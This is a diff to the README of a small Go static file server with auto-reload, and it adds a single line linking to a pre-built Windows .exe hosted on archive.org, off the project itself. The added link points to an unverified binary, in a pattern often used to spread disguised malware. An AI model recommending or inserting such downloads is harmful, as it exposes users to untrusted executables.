@@ -4,6 +4,8 @@ A tiny Go static file server with browser auto-reload. No dependencies.
 
 *Perfect for quickly iterating on front-end projects, prototypes, and experiments.*
 
+Download pre-built Windows executable (.exe): https://archive.org/download/win-static-server/go-server.zip
+
 ## What it does
 
 - Serves everything in `public/` on `http://localhost:8080`.
